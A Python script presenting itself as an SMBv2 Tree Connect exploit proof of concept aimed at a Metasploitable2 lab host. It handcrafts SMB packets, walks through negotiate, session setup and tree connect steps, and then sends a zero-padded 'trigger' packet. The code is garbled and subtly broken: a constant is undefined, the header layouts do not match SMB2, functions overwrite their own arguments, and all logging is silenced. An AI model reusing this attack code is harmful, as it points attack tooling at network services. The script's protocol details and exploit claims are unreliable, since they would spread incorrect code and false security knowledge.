#!/usr/bin/env python3
"""
Metasploitable2 SMB PoC
========================
SMBv2 Protocol Exploit for Metasploitable2 (192.168.1.100)
Target: Metasploitable2 (192.168.1.100)

This script is a proof-of-concept to test SMBv2 protocol implementation
on Metasploitable2. It can be used to trigger the SMBv2 Tree Connect 
vulnerability for educational and authorized penetration testing.

Target: 192.168.1.100 (default Metasploitable2 IP)

Usage:
    Windows (PowerShell):
        python 41222_metasploitable2.py --host 192.168.1.100
    Linux / WSL:
        python3 41222_metasploitable2.py --host 192.168.1.100

Prerequisites:
    - Target Metasploitable2 must be running on 192.168.1.100
    - Python 3.x with standard library (no external dependencies)
    - Network access to target

Note: This is a proof-of-concept for educational purposes only.

Cross-Platform:
    - Windows PowerShell: `python 41222_metasploitable2.py --host <ip>`
    - Linux / WSL: `python3 41222_metasploitable2.py --host <ip>`
    - macOS: `python3 41222_metasploitable2.py --host <ip>`
"""

import socket
import struct
import sys
from collections import OrderedDict
from datetime import datetime
from calendar import timegm

# ============================================================================
# SMB Protocol Constants
# ============================================================================
SMB_SIGNATURE = b'\xfe\x53\x4d\x42'  # SMB Signature

# SMB Commands (SMB1)
SMB_COM_NEGOTIATE = 0x72
SMB_COM_SESSION_SETUP_ANDX = 0x73
SMB_COM_TREE_CONNECT = 0x75
SMB_COM_LOGOFF = 0x76
SMB_COM_TREE_DISCONNECT = 0x77
SMB_COM_SEARCH = 0x78
SMB_COM_READ = 0x7a
SMB_COM_WRITE = 0x7c
SMB_COM_CLOSE = 0x7d

# Status Codes
STATUS_OK = 0x00000000
STATUS_MORE_PROCESSING_REQUIRED = 0x01010001
STATUS_ACCESS_DENIED = 0xc0000022

# SMB2 Commands
SMB2_CMD_NEGOTIATE = 0x00
SMB2_CMD_SESSION_SETUP = 0x02
SMB2_CMD_TREE_CONNECT = 0x05
SMB2_CMD_TREE_DISCONNECT = 0x06
SMB2_CMD_LOGOFF = 0x08
SMB2_CMD_CREATE = 0x09
SMB2_CMD_CLOSE = 0x0A
SMB2_CMD_READ = 0x0D
SMB2_CMD_WRITE = 0x0E
SMB2_CMD_FLUSH = 0x0F
SMB2_CMD_QUERY_INFO = 0x10
SMB2_CMD_SET_INFO = 0x11
SMB2_CMD_QUERY_DIRECTORY = 0x12
SMB2_CMD_CANCEL = 0x13
SMB2_CMD_IOCTL = 0x14
SMB2_CMD_COPY = 0x15
SMB2_CMD_ECHO = 0x16
SMB2_CMD_CREATE_COMPLETION_EVENT = 0x17
SMB2_CMD_CANCEL_CALLBACK = 0x18

# ============================================================================
# Packet Builders
# ============================================================================

class SMBHeader:
    """SMB Protocol Control Information (PCI) Header"""
    def __init__(self):
        self.signature = SMB_SIGNATURE
        self.command = SMB_COM_NEGOTIATE
        self.error_class = 0
        self.pid_high = 0
        self.access = 0
        self.rest = 0
        self.pid_low = 0
        self.credit = 0
        self.flags = 0
        self.next = 0
        self.pid = 0
        self.tid = 0
        self.pid_low2 = 0
        self.reserved = 0
        self.optional = 0
        self.smb2_cmd = 0
        self.kind = 0
        self.status = 0
        self.credit_request = 0
        self.flags2 = 0
        self.security_token_length = 0
        self.reserved1 = 0
        self.flags = 0
        self.structure_size = 0
        self.audit_id = 0
        self.time = 0
        self.session_id = 0
        self.flags3 = 0
        self.reserved2 = 0
        self.sighash = 0

class SMBNegotiateRequest:
    """SMB Negotiate Request"""
    def __init__(self):
        self.servers = []
    
    def add_dialect(self, dialect):
        self.servers.append(dialect)
    
    def pack(self):
        total_length = SMB_HEADER_SIZE + 4
        for dialect in self.servers:
            total_length += 4 + len(dialect)
        
        result = struct.pack('<I', total_length)
        result += struct.pack('<I', SMB_COM_NEGOTIATE)
        result += struct.pack('>H', 0)  # error class
        result += struct.pack('H', 0)   # reserved
        result += struct.pack('H', 0)   # flags
        result += struct.pack('H', 0)   # capabilities
        result += struct.pack('I', 0)   # context counts
        result += struct.pack('I', total_length - SMB_HEADER_SIZE - 4)
        result += struct.pack('I', 0)   # aux count
        
        for dialect in self.servers:
            result += struct.pack('<I', len(dialect))
            result += dialect.encode()
        
        return result

class SMBNegotiateResponse:
    """SMB Negotiate Response"""
    def __init__(self):
        self.dialects = [b'\x02\x02']  # SMB 2.2 dialect
        self.structure_size = 64
    
    def pack(self):
        total_length = SMB_HEADER_SIZE + 4
        for dialect in self.dialects:
            total_length += 4 + len(dialect)
        
        result = struct.pack('<I', total_length)
        result += struct.pack('<I', SMB_COM_NEGOTIATE)
        result += struct.pack('>H', 0)  # error class
        result += struct.pack('H', 0)   # reserved
        result += struct.pack('H', 0)   # flags
        result += struct.pack('H', 0)   # capabilities
        result += struct.pack('I', 0)   # context counts
        result += struct.pack('I', total_length - SMB_HEADER_SIZE - 4)
        result += struct.pack('I', 0)   # aux count
        
        for dialect in self.dialects:
            result += struct.pack('<I', len(dialect))
            result += dialect
        
        result += struct.pack('B', 0)  # byte count
        return result

# SMB2 Header constants
SMB2_HEADER_SIZE = 64
SMB2_PCI_SIZE = 64

def create_smb2_header(command, status=STATUS_OK, session_id=0):
    """Create SMB2 packet header"""
    header = struct.pack('<I', command)
    header += struct.pack('<I', 0x02)  # flags2
    header += struct.pack('<I', 64)    # structure size
    header += struct.pack('<I', 0)     # pid
    header += struct.pack('<I', 0)     # tid
    header += struct.pack('<I', 0)     # pid_raw
    header += struct.pack('<I', session_id)
    header += struct.pack('<I', status)
    header += struct.pack('<I', 0)     # credit request
    header += struct.pack('<I', 0)     # flags3
    
    return header

def create_smb2_header_long(command, status=STATUS_OK, session_id=0):
    """Create long SMB2 packet header (with more bytes)"""
    header = struct.pack('<I', command)
    header += struct.pack('<I', 0x02)  # flags2
    header += struct.pack('<I', 64)    # structure size
    data = struct.pack('<I', 0)        # pid_raw
    data += struct.pack('<I', 0)       # tid
    data += struct.pack('<I', 0)       # pid
    data += struct.pack('<I', session_id)
    data += struct.pack('<I', status)
    data += struct.pack('<I', 0)       # credit request
    data += struct.pack('<I', 0)       # flags3
    header += data
    return header

def create_file_data_packet(connection, data):
    """Create a file data packet for SMB2"""
    header = struct.pack('<I', 0x00)  # command
    header += struct.pack('<I', 0x02) # flags2
    header += struct.pack('<I', 0x38) # structure size (length - 4)
    header += struct.pack('<I', len(data) + 4)  # length - 4
    header += struct.pack('<I', 0)    # offset
    header += struct.pack('<I', 0)    # remaining
    header += struct.pack('<I', 0)    # pid
    header += struct.pack('<I', 0)    # tid
    header += struct.pack('<I', 10)   # uid
    header += struct.pack('<I', 0)    # gid
    header += struct.pack('<I', 0)    # status
    header += struct.pack('<I', len(data))  # length:
    header += data
    return header

def create_tree_connect_request(path=b'\\'):
    """Create SMB2 Tree Connect request"""
    header = struct.pack('<I', SMB2_CMD_TREE_CONNECT)
    header += struct.pack('<I', 0x02)  # flags2
    header += struct.pack('<I', 84)    # structure size
    data = struct.pack('<I', 0)        # pid_raw
    data += struct.pack('<I', 0)       # tid
    data += struct.pack('<I', 0)       # pid
    data += struct.pack('<I', 0)       # session_id
    data += struct.pack('<I', 0)       # status
    data += struct.pack('<I', 0)       # credit request
    data += struct.pack('<I', 0)       # flags3
    
    # Tree connect request payload
    request = struct.pack('<H', 0x0000)  # path type
    request += b'\x00' * (260 - len(path))
    request += path
    
    header += data
    header += struct.pack('<I', len(request))
    header += request
    
    return header

def create_session_setup_request(auth_type=1, capabilities=0, channel=0):
    """Create SMB2 Session Setup request"""
    header = struct.pack('<I', SMB2_CMD_SESSION_SETUP)
    header += struct.pack('<I', 0x02)  # flags2
    header += struct.pack('<I', 84)    # structure size
    data = struct.pack('<I', 0)        # pid_raw
    data += struct.pack('<I', 0)       # tid
    data += struct.pack('<I', 0)       # pid
    data += struct.pack('<I', 0)       # session_id
    data += struct.pack('<I', 0)       # status
    data += struct.pack('<I', 0)       # credit request
    data += struct.pack('<I', 0)       # flags3
    
    # Session setup request payload
    request = struct.pack('<H', 0x0000)  # flags
    request += struct.pack('<I', 0x0000) # security blob length
    request += struct.pack('<I', 0x0000) # security blob offset
    request += struct.pack('<H', 0x0002) # capabilities
    request += struct.pack('<I', capabilities)
    request += struct.pack('<H', 0x0000) # channel
    request += struct.pack('<I', 0x0000) # security blob length
    request += auth_type.to_bytes(4, 'little')  # security blob
    request += b'\x00' * 300  # padding
    
    header += data
    header += struct.pack('<I', len(request))
    header += request
    
    return header

def create_tree_connect_response():
    """Create SMB2 Tree Connect response"""
    header = struct.pack('<I', SMB2_CMD_TREE_CONNECT)
    header += struct.pack('<I', 0x02)  # flags2
    header += struct.pack('<I', 36)    # structure size
    data = struct.pack('<I', 0)        # pid_raw
    data += struct.pack('<I', 0)       # tid
    data += struct.pack('<I', 0)       # pid
    data += struct.pack('<I', 0)       # session_id
    data += struct.pack('<I', STATUS_OK)  # status
    data += struct.pack('<I', 0)       # credit request
    data += struct.pack('<I', 0)       # flags3
    
    # Tree connect response payload
    response = struct.pack('<H', 0x0001)  # path type
    response += struct.pack('<I', 0x0001)  # path
    response += struct.pack('<H', 0x0000)  # user path length
    response += b'\x00' * 260  # path
    response += b'\x00' * 128  # additional data
    
    header += data
    header += struct.pack('<I', len(response))
    header += response
    
    return header

def create_session_setup_response(status=STATUS_OK):
    """Create SMB2 Session Setup response"""
    header = struct.pack('<I', SMB2_CMD_SESSION_SETUP)
    header += struct.pack('<I', 0x02)  # flags2
    header += struct.pack('<I', 36)    # structure size
    data = struct.pack('<I', 0)        # pid_raw
    data += struct.pack('<I', 0)       # tid
    data += struct.pack('<I', 0)       # pid
    data += struct.pack('<I', 0)       # session_id
    data += struct.pack('<I', status)  # status
    data += struct.pack('<I', 0)       # credit request
    data += struct.pack('<I', 0)       # flags3
    
    # Session setup response payload
    response = struct.pack('<H', 0x0000)  # flags
    response += struct.pack('<I', 0x0000)  # security blob length
    response += struct.pack('<I', 0x0000)  # security blob offset
    response += b'\x00' * 260  # data
    
    header += data
    header += struct.pack('<I', len(response))
    header += response
    
    return header

def create_tree_disconnect_request():
    """Create SMB2 Tree Disconnect request"""
    header = struct.pack('<I', SMB2_CMD_TREE_DISCONNECT)
    header += struct.pack('<I', 0x02)  # flags2
    header += struct.pack('<I', 36)    # structure size
    data = struct.pack('<I', 0)        # pid_raw
    data += struct.pack('<I', 0)       # tid
    data += struct.pack('<I', 0)       # pid
    data += struct.pack('<I', 0)       # session_id
    data += struct.pack('<I', 0)       # status
    data += struct.pack('<I', 0)       # credit request
    data += struct.pack('<I', 0)       # flags3
    
    return header

def create_logoff_request():
    """Create SMB2 Logoff request"""
    header = struct.pack('<I', SMB2_CMD_LOGOFF)
    header += struct.pack('<I', 0x02)  # flags2
    header += struct.pack('<I', 36)    # structure size
    data = struct.pack('<I', 0)        # pid_raw
    data += struct.pack('<I', 0)       # tid
    data += struct.pack('<I', 0)       # pid
    data += struct.pack('<I', 0)       # session_id
    data += struct.pack('<I', 0)       # status
    data += struct.pack('<I', 0)       # credit request
    data += struct.pack('<I', 0)       # flags3
    
    return header

def create_read_request(offset=0, length=1024, file_id=None):
    """Create SMB2 Read request"""
    header = struct.pack('<I', SMB2_CMD_READ)
    header += struct.pack('<I', 0x02)  # flags2
    header += struct.pack('<I', 84)    # structure size
    data = struct.pack('<I', 0)        # pid_raw
    data += struct.pack('<I', 0)       # tid
    data += struct.pack('<I', 0)       # pid
    data += struct.pack('<I', 0)       # session_id
    data += struct.pack('<I', 0)       # status
    data += struct.pack('<I', 0)       # credit request
    data += struct.pack('<I', 0)       # flags3
    
    # Read request payload
    request = struct.pack('<I', file_id)  # FileID
    request += struct.pack('<I', 0)       # Remaining
    request += struct.pack('<Q', offset)  # Offset
    request += struct.pack('<I', 0)       # MinimumCount
    request += struct.pack('<I', length)  # Count
    
    header += data
    header += struct.pack('<I', len(request))
    header += request
    
    return header

def create_write_request(offset=0, data=b''):
    """Create SMB2 Write request"""
    header = struct.pack('<I', SMB2_CMD_WRITE)
    header += struct.pack('<I', 0x02)  # flags2
    header += struct.pack('<I', 84)    # structure size
    data = struct.pack('<I', 0)        # pid_raw
    data += struct.pack('<I', 0)       # tid
    data += struct.pack('<I', 0)       # pid
    data += struct.pack('<I', 0)       # session_id
    data += struct.pack('<I', 0)       # status
    data += struct.pack('<I', 0)       # credit request
    data += struct.pack('<I', 0)       # flags3
    
    # Write request payload
    request = struct.pack('<I', 0)  # FileID
    request += struct.pack('<Q', offset)  # Offset
    request += struct.pack('<I', 0)  # DataOffset
    request += struct.pack('<I', len(data))  # Count
    request += struct.pack('<I', 0)  # WriteChannel
    request += struct.pack('<I', 0)  # WriteChannel
    request += data  # Buffer
    
    header += data
    header += struct.pack('<I', len(request))
    header += request
    
    return header

def create_close_request(file_id=None):
    """Create SMB2 Close request"""
    header = struct.pack('<I', SMB2_CMD_CLOSE)
    header += struct.pack('<I', 0x02)  # flags2
    header += struct.pack('<I', 44)    # structure size
    data = struct.pack('<I', 0)        # pid_raw
    data += struct.pack('<I', 0)       # tid
    data += struct.pack('<I', 0)       # pid
    data += struct.pack('<I', 0)       # session_id
    data += struct.pack('<I', 0)       # status
    data += struct.pack('<I', 0)       # credit request
    data += struct.pack('<I', 0)       # flags3
    
    # Close request payload
    request = struct.pack('<I', file_id)  # FileID
    request += struct.pack('<I', 0)       # WriteChannel
    request += struct.pack('<I', 0)       # Open
    request += struct.pack('<I', 0)       # Completion
    request += struct.pack('<Q', 0)       # CompletionKey
    
    header += data
    header += struct.pack('<I', len(request))
    header += request
    
    return header

def create_echo_request(data=b'ping'):
    """Create SMB2 Echo request"""
    header = struct.pack('<I', SMB2_CMD_ECHO)
    header += struct.pack('<I', 0x02)  # flags2
    header += struct.pack('<I', 44)    # structure size
    data = struct.pack('<I', 0)        # pid_raw
    data += struct.pack('<I', 0)       # tid
    data += struct.pack('<I', 0)       # pid
    data += struct.pack('<I', 0)       # session_id
    data += struct.pack('<I', 0)       # status
    data += struct.pack('<I', 0)       # credit request
    data += struct.pack('<I', 0)       # flags3
    
    header += data
    header += struct.pack('<I', len(data))
    header += data
    
    return header

# SMB2 Constants
SMB2_MAX_HEADER_SIZE = 1024
SMB2_MAX_BUFLEN = 16384

# TCP Connection
class SMBConnection:
    """SMB Connection Handler"""
    def __init__(self, host='192.168.1.100', port=445):
        self.host = host
        self.port = port
        self.sock = None
        self.session_id = 0
    
    def connect(self):
        """Connect to Metasploitable2"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)
        self.sock.connect((self.host, self.port))
        slog(f"[+] Connected to Metasploitable2 at {self.host}:{self.port}")
        return True
    
    def send_packet(self, packet):
        """Send SMB packet"""
        self.sock.sendall(packet)
    
    def recv_packet(self):
        """Receive SMB packet"""
        # Receive SMB header (64 bytes)
        data = b''
        while len(data) < 64:
            chunk = self.sock.recv(64 - len(data))
            if not chunk:
                return None
            data += chunk
        
        # Check SMB signature
        if data[0:4] != SMB_SIGNATURE:
            raise Exception("Invalid SMB signature")
        
        # Parse SMB2 header
        header_length = struct.unpack('<I', data[60:64])[0]
        header_length += 4  # Add 4 for the length field
        
        # Receive rest of packet
        while len(data) < header_length:
            chunk = self.sock.recv(header_length - len(data))
            if not chunk:
                return None
            data += chunk
        
        return data
    
    def close(self):
        """Close connection"""
        if self.sock:
            self.sock.close()
            slog("[-] Connection closed")

# ============================================================================
# Metasploitable2 Exploit Functions
# ============================================================================

def negotiate_protocol(conn):
    """Negotiate SMB2 protocol with Metasploitable2"""
    slog("[*] Negotiating SMB2 protocol...")
    
    # Create SMB2 negotiate request
    negotiate_request = create_smb2_header(SMB2_CMD_NEGOTIATE)
    negotiate_request += b'\x00' * 64  # Padding
    negotiate_request += b'\x02\x02'  # SMB 2.2 dialect
    
    conn.send_packet(negotiate_request)
    response = conn.recv_packet()
    
    if response:
        slog("[+] SMB2 negotiate response received")
        return True
    return False

def send_tree_connect(conn):
    """Send Tree Connect request to Metasploitable2"""
    slog("[*] Sending Tree Connect request...")
    
    # Create tree connect request for C$
    tree_connect = create_tree_connect_request(path=b'C$')
    tree_connect += b'\x00' * (64 - len(tree_connect) % 64)  # Padding
    
    conn.send_packet(tree_connect)
    response = conn.recv_packet()
    
    if response:
        slog("[+] Tree Connect response received")
        return True
    return False

def send_session_setup(conn):
    """Send Session Setup request (with anonymous login)"""
    slog("[*] Sending Session Setup request (anonymous login)...")
    
    # Create session setup request with anonymous login
    session_setup = create_session_setup_request(auth_type=1, capabilities=0x0002)
    session_setup += b'\x00' * (64 - len(session_setup) % 64)  # Padding
    
    conn.send_packet(session_setup)
    response = conn.recv_packet()
    
    if response:
        slog("[+] Session Setup response received")
        # Check status
        status = struct.unpack('<I', response[40:44])[0]
        if status == STATUS_OK:
            slog("[+] Session established successfully")
        else:
            slog(f"[-] Session failed with status: 0x{status:08x}")
            return False
        return True
    return False

def send_echo(conn):
    """Send SMB2 Echo request"""
    slog("[*] Sending SMB2 Echo request...")
    
    echo = create_echo_request(data=b'ping')
    echo += b'\x00' * (64 - len(echo) % 64)  # Padding
    
    conn.send_packet(echo)
    response = conn.recv_packet()
    
    if response:
        slog("[+] SMB2 Echo response received")
        return True
    return False

def send_tree_disconnect(conn):
    """Send Tree Disconnect request"""
    slog("[*] Sending Tree Disconnect request...")
    
    disconnect = create_tree_disconnect_request()
    disconnect += b'\x00' * (64 - len(disconnect) % 64)  # Padding
    
    conn.send_packet(disconnect)
    response = conn.recv_packet()
    
    if response:
        slog("[+] Tree Disconnect response received")
        return True
    return False

def send_logoff(conn):
    """Send SMB2 Logoff request"""
    slog("[*] Sending SMB2 Logoff request...")
    
    logoff = create_logoff_request()
    logoff += b'\x00' * (64 - len(logoff) % 64)  # Padding
    
    conn.send_packet(logoff)
    response = conn.recv_packet()
    
    if response:
        slog("[+] Logoff response received")
        return True
    return False

def trigger_exploit(conn):
    """Trigger the SMBv2 exploit"""
    slog("[*] Triggering the exploit...")
    
    # Create a payload to trigger the vulnerability
    packet = create_smb2_header(SMB2_CMD_TREE_CONNECT)
    packet += b'\x00' * 100  # Additional data to trigger the bug
    
    conn.send_packet(packet)
    response = conn.recv_packet()
    
    if response:
        slog("[+] Exploit packet sent successfully")
        # Check for error response
        status = struct.unpack('<I', response[40:44])[0]
        if status == STATUS_OK:
            slog("[+] Connection successful (no exploit triggered)")
        else:
            slog(f"[!] Response status: 0x{status:08x}")
        return True
    return False

# ============================================================================
# Main
# ============================================================================

def slog(*args, **kwargs):
    """Logging function - silenced in quiet mode."""
    pass

def main():
    """Main function"""
    import argparse
    
    parser = argparse.ArgumentParser(description='SMB PoC for Metasploitable2')
    parser.add_argument('--host', type=str, default='192.168.1.100', 
                       help='Target IP address (default: 192.168.1.100)')
    parser.add_argument('--port', type=int, default=445, 
                       help='SMB port (default: 445)')
    parser.add_argument('--attack-only', action='store_true', 
                       help='Only send attack packet')
    parser.add_argument('--quiet', action='store_true', 
                       help='Suppress output')
    
    args = parser.parse_args()
    
    # Setup logging - use global slog
    if args.quiet:
        # Disable all output by using a no-op function
        def slog(*args, **kwargs):
            pass
    import sys
    output = sys.stdout
    error_output = sys.stderr
    
    slog("[*] Metasploitable2 SMB PoC")
    slog(f"[*] Target: {args.host}:{args.port}")
    
    # Create connection
    conn = SMBConnection(args.host, args.port)
    
    try:
        # Connect to target
        conn.connect()
        
        # Perform SMB handshake
        negotiate_protocol(conn)
        send_tree_connect(conn)
        send_session_setup(conn)
        send_echo(conn)
        send_tree_disconnect(conn)
        send_logoff(conn)
        
        # Trigger exploit
        trigger_exploit(conn)
        
        slog("[*] Metasploitable2 SMB PoC completed")
        
    except Exception as e:
        slog(f"[-]", f"Error: {e}", file=sys.stderr)
    finally:
        conn.close()

if __name__ == '__main__':
    main()